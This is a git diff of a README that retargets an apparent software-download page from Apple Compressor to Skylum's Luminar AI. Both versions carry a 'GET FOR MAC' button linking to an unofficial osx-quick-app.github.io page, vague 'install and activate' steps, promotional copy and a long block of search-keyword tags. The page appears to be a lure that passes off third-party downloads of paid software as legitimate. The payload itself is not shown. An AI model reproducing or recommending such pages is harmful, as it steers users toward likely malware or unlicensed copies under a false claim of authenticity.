@@ -1,12 +1,12 @@
-# Apple Compressor – Advanced Video Encoding Suite for macOS  
+# Luminar AI – Smart Photo Enhancement with Advanced Artificial Intelligence for MacOS
 
 <div align="center">  
-  <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/a5/5f/4f/a55f4ff4-7a91-2df6-1d4d-52b455b61a26/AppIcon-85-220-0-5-0-0-2x-0-0.png/1200x630bb.png" width="250"/>  
+  <img src="https://media.macphun.com/img/uploads/uploads/skylum/luminar-ai-main/lai-logo.png" width="250"/>  
 </div>  
 <br>  
 <div align="center">  
 
-[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-quick-app.github.io/.github/compressor)  
+[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-quick-app.github.io/.github/luminarai)  
 
 </div>  
 
@@ -15,24 +15,24 @@
 # Installation Instructions  
 
 1. Go To The Website Using The Button Above.  
-2. Follow The On-Screen Steps To Install And Activate Apple Compressor On Your Mac Device.  
+2. Follow The On-Screen Steps To Install And Activate Luminar AI On Your Mac Device.  
 
 ---  
 
 <div align="center">  
-  <img src="https://discussions.apple.com/content/attachment/7cf44ec4-613d-4205-b3bc-9a9ef3e868db" width="1080"/>  
+  <img src="https://macx.ws/uploads/posts/2020-12/1608108246_luminar-ai_02.jpg" width="1080"/>  
 </div>  
 <br>  
 
 ## 🧩 Overview  
 
-**Apple Compressor for macOS** is a professional-grade video encoding tool tailored for filmmakers, editors, and content creators who require complete control over their export process. It delivers exceptional performance when paired with **Final Cut Pro** and **Motion**, ensuring seamless media preparation for any platform or format.  
+**Luminar AI for macOS** brings a completely new approach to photo editing — fast, intelligent, and effortless. Built by **Skylum**, this software combines artificial intelligence with creative control, giving users the ability to produce visually stunning images in seconds while maintaining a natural, professional look.  
 
-Compressor supports **ProRes, HEVC, H.264**, and **HDR** formats, allowing you to produce high-quality outputs for streaming services, cinema, and broadcast. You can build custom export profiles, automate repetitive tasks, and batch-process large volumes of media to save time and maintain consistency across projects.  
+With features like **Sky AI**, **Accent AI**, and **Face AI**, Luminar AI automatically detects subjects, lighting, and depth in your photos, adjusting them intelligently for optimal balance and detail. Instead of spending hours in manual retouching, you can achieve perfect results with a single click.  
 
-Thanks to **Apple Silicon optimization**, Compressor delivers incredibly fast render times with low power consumption. Distributed encoding allows you to connect multiple Macs and share the workload for even greater efficiency.  
+Its streamlined interface is designed for efficiency — whether you’re a beginner or an experienced photographer, Luminar AI adapts to your workflow. The built-in **Templates and Presets** feature recommends enhancements tailored to your photo’s composition, color, and style.  
 
-From mastering cinematic films to compressing short-form content, **Apple Compressor** gives professionals the flexibility, precision, and speed needed to handle any post-production challenge.  
+Optimized for **macOS and Apple Silicon (M1/M2/M3)**, Luminar AI delivers smooth real-time editing, quick exports, and a lag-free experience even when working with high-resolution RAW files. It also integrates seamlessly with **Lightroom**, **Photoshop**, and **Apple Photos**.  
 
 ---  
 
@@ -40,14 +40,14 @@ From mastering cinematic films to compressing short-form content, **Apple Compre
 
 | Feature | Description |
 |----------|-------------|
-| 🎬 **Comprehensive Format Support** | Encode in ProRes, HEVC, and other high-quality professional codecs. |
-| ⚙️ **Custom Export Profiles** | Save and reuse personalized encoding presets for future projects. |
-| ⚡ **Performance Optimized for M1/M2** | Leverages Apple Silicon for faster rendering and improved efficiency. |
-| 🧩 **Batch Encoding** | Process multiple video files simultaneously with ease. |
-| 🖥️ **Final Cut Pro Integration** | Seamlessly export from Final Cut or Motion with shared encoding settings. |
-| ☁️ **Distributed Rendering** | Accelerate exports by linking several Macs together. |
-| 🎧 **Audio and Metadata Tools** | Fine-tune audio tracks, metadata, and subtitles for professional delivery. |
-| 📦 **Automated Workflows** | Create repeatable encoding pipelines for consistent output. |
+| 🧠 **AI-Driven Photo Enhancement** | Automatically analyzes and optimizes photos for color, tone, and contrast. |
+| 🎨 **Adaptive Templates** | Personalized editing suggestions for different types of photography. |
+| ☀️ **Sky Replacement Engine** | Replace skies instantly with realistic lighting and reflection adjustments. |
+| 👩‍🎨 **Portrait Perfection Tools** | Use AI to enhance skin tone, eyes, and facial lighting naturally. |
+| ⚙️ **Fast macOS Performance** | Fully optimized for Apple Silicon chips with lightning-fast rendering. |
+| 📂 **RAW and TIFF Compatibility** | Works with nearly all modern image formats for maximum flexibility. |
+| 🔗 **Plugin Integration** | Add Luminar AI directly into Lightroom or Photoshop workflows. |
+| 🌈 **Natural Color Rendering** | Maintains authentic hues and detail while enhancing clarity. |
 
 ---  
 
@@ -55,14 +55,14 @@ From mastering cinematic films to compressing short-form content, **Apple Compre
 
 | Component     | Minimum Specifications            |
 |---------------|-----------------------------------|
-| OS            | macOS 11.5 or newer               |
-| Processor     | Apple Silicon (M1/M2) or Intel    |
+| OS            | macOS 11.0 or newer               |
+| Processor     | Apple Silicon (M1/M2/M3) or Intel |
 | Memory        | 8 GB RAM or higher                |
-| Storage       | 3 GB of free disk space           |
+| Storage       | 10 GB free disk space             |
 | Display       | 1280×800 resolution or higher     |
 
 ---  
 
 ## 🏷️ Tags  
 
-apple compressor app • apple compressor software • apple compressor • compressor apple app • compressor final cut pro • compressor final cut • compressor macbook • apple video compressor • apple compress files • apple compress video • apple compressor 4 • apple compressor download • apple compressor price • apple compressor mp4 • apple compressor mov to mp4 • compress video app mac • compress pdf in macbook • compressor mac app • compressor final cut pro x • final cut pro motion compressor • free compressor for final cut pro • video compressor app mac  
+luminar mac • luminar • luminar app • luminar mac app • luminar software • luminar ai software • luminar ai app • luminar ai mac • luminar ai • skylum luminar • luminar photo editing • luminar 4 • skylum luminar ai • luminar technologies • ai upscale photo • luminar photo editor • luminar pro • luminar photo • luminar skylum • luminar ai review • luminar ai price • luminar ai photo editing • luminar editing • luminar new • luminar ai download mac • luminar price • luminar ai online • luminar photo editing software  
